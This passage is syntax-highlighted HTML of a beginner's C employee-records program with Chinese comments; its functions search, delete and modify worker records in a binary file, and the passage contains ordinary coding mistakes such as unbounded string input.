keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token comment">//用found数组进行比较如果found数组和name相同则执行；</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>        <span class="token comment">//当</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">f_4</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//删除数据；</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> find<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要删除的职工号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>find<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;=</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            NUM<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token comment">//将num--这个操作，更改变量的大小，方便再次存入。</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>NUM<span class="token operator">&lt;</span>j<span class="token punctuation">)</span>        <span class="token comment">//如果没有提前结束，j的最终大小回是num+1;判断num是否及时结束。</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"该职工号不存在！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token punctuation">;</span> j<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//将read[j]进行移位，达到删除的目的；</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭文件</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//定义一个</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"wb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"删除失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//使用一个txt格式的文件作为辅助，进行数据量的计数。</span>    <span class="token function">itoa</span><span class="token punctuation">(</span>NUM<span class="token punctuation">,</span>ch<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//一个没学过的函数，把整形数转化成字符型；</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_5</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//在文件中读取数据，对数据进行修改，最后在存入文件中。</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span>NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> find<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要修改的职工号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>find<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.修改员工号                   2.修改姓名             ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.修改性别                     4.修改担任职务         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   5.修改年龄                     6.修改员工工资         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   7.修改员工家庭住址             8.修改员工联系方式     ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token operator">=</span>workers<span class="token punctuation">;</span>            <span class="token keyword">int</span> n<span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>n<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工号:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入姓名:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入性别:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入所担任职务:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入年龄："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入工资:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入家庭住址："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工联系方式："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//以全部重新输入的形式去替换原本数据，达到修改的目的；</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"wb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件修改失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"修改成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//最后返回操作界面；</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></s